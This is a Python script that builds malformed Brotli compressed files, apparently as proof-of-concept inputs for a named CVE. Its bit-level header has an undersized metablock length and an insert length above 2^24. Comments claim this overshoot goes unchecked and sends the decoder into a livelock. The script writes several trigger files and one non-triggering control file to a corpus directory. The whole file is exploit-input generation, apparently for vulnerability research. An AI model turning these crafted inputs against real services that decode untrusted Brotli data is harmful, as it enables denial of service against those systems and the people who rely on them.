#!/usr/bin/env python3
"""Hand-built bitstreams for CVE-2026-111497 construct A2 (see
lanes/glm1/construct-map.md). Pure-Python LSB-first Brotli bit writer.
Emits into corpus/constructs/. No third-party decoders touched."""
import os

class BitWriter:
    def __init__(self):
        self.acc = 0
        self.n = 0
        self.out = bytearray()
    def put(self, value, bits):
        assert bits >= 0 and (bits == 0 or 0 <= value < (1 << bits)), (value, bits)
        self.acc |= (value & ((1 << bits) - 1)) << self.n
        self.n += bits
        while self.n >= 8:
            self.out.append(self.acc & 0xFF)
            self.acc >>= 8
            self.n -= 8
    def bytes(self):
        b = bytearray(self.out)
        if self.n:
            b.append(self.acc & 0xFF)
        return b

def varlen_uint8_value_0(bw):  # DecodeVarLenUint8 -> 0 => NBLTYPES/NTREES = 1
    bw.put(0, 1)               # bit '0' -> value 0 (+1 => 1)

def simple_huff_1sym(bw, symbol, alphabet_size_max):
    # ReadHuffmanCode: 2-bit '01' = simple; 2-bit NSYM-1 = 0; symbol in max_bits
    bw.put(1, 2)
    bw.put(0, 2)
    max_bits = (max(alphabet_size_max - 1, 1)).bit_length() - 1  # Log2Floor
    bw.put(symbol, max_bits)

def build_a2(nsym=1, insert_extra=16754624, pad=64, mlen_minus1=0):
    """insert = 22594 + insert_extra; need > 2**24."""
    bw = BitWriter()
    # stream header
    bw.put(0, 1)              # WBITS -> 16
    # metablock header
    bw.put(1, 1)              # ISLAST = 1
    bw.put(0, 1)              # ISLASTEMPTY = 0
    bw.put(0, 2)              # MNIBBLES code 0 -> 4 nibbles
    bw.put(mlen_minus1, 16)   # MLEN-1 (tiny; overshoot unchecked upstream)
    bw.put(0, 1)              # ISUNCOMPRESSED = 0
    # block types: all 1 -> no block type/count codes, no block switches possible
    for _ in range(3):
        varlen_uint8_value_0(bw)          # NBLTYPESL/C/D = 1
    bw.put(0, 2)              # NPOSTFIX = 0
    bw.put(0, 4)              # NDIRECT = 0
    bw.put(0, 2)              # CMPL = 0 (context mode LSB6; cmap trivial => bulk path)
    varlen_uint8_value_0(bw)  # NTREESL = 1 -> no literal context map
    varlen_uint8_value_0(bw)  # NTREESD = 1 -> no dist context map
    # htree groups in order: literal, insert&copy, distance
    if nsym == 1:
        simple_huff_1sym(bw, 0, 256)          # literal symbol 0, 0-bit code
    else:
        bw.put(1, 2)                          # simple
        bw.put(1, 2)                          # NSYM-1 = 1 (2 symbols)
        bw.put(0, 7); bw.put(1, 7)            # symbols 0,1 (7-bit reads), 1-bit codes
    simple_huff_1sym(bw, 504, 704)            # cmd sym 504: ins extra 24, offset 22594, copy 2
    simple_huff_1sym(bw, 0, 64)                # dist symbol 0 (never reached); alphabet 16+(24<<1)=64
    # command stream
    bw.put(insert_extra, 24)                  # insert = 22594 + insert_extra > 2**24
    # copy extra bits: 0 ; distance never read (livelock in literals first)
    data = bw.bytes()
    return bytes(data) + b"\x00" * pad

OUT = os.path.join(os.path.dirname(__file__), "..", "corpus", "constructs")
os.makedirs(OUT, exist_ok=True)

def emit(name, data):
    with open(os.path.join(OUT, name), "wb") as f:
        f.write(data)
    print("%-24s %6d bytes" % (name, len(data)))

emit("a2_nsym1.br", build_a2(nsym=1, pad=64))
emit("a2_nsym1_short.br", build_a2(nsym=1, pad=4))
emit("a2_nsym2.br", build_a2(nsym=2, pad=(1 << 21) + 64))  # 1-bit literals: keep bit reader fed
# control shape: same header but insert below the 2^24 block length -> valid-ish, no trigger
emit("a2_noswitch_ctrl.br", build_a2(nsym=1, insert_extra=1024, pad=64))
